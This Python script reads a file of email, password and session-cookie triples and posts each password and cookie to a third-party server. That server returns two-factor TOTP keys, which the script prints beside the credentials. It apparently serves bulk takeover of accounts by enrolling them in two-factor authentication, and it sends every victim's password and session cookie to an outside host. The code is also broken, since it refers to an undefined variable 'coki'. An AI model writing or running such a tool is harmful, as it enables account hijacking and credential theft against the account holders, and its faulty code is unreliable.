import os
import requests as r
os.system('clear')
print(45*'-')
print('\t\t Create By Raj')
print(45*'-')
def A2FA(email,pas,cookie):
    s=r.post('https://mdraj.pythonanywhere.com/tfa/auth1',data={'pasw':pas,'cookie':coki}).json()
    if s['status'] == True:
        if s['data'] == None:
            print(' [=] Email: '+str(email))
            print(' [=] Pasw: '+str(pas))
            print(' [=] TOTP: '+str(s['key']))
            print(45*'-')
        else:
            print(' [=] Otp Email: '+str(email))
            print(45*'-')
            otp=input(' [=] OTP: ')
            print(45*'-')
            y=r.post('https://mdraj.pythonanywhere.com/tfa/auth2',data={'data':s['data'],'nonce':s['nonce'],'otp':otp,'cookie':coki}).json()
            if y['status'] == True:
                print(' [=] Email: '+str(email))
                print(' [=] Pasw: '+str(pas))
                print(' [=] TOTP: '+str(y['key']))
                print(45*'-')
            else:pass
    else:pass

try:
    path=input(' [=] File Path: ')
    print(45*'-')
    file = open(path,'r',encoding='utf-8').read().splitlines()
    for x in file:
        email,pas,cookie = x.strip().split("|")
        A2FA(email,pas,cookie)
except:exit(" [=] FILE KOI?")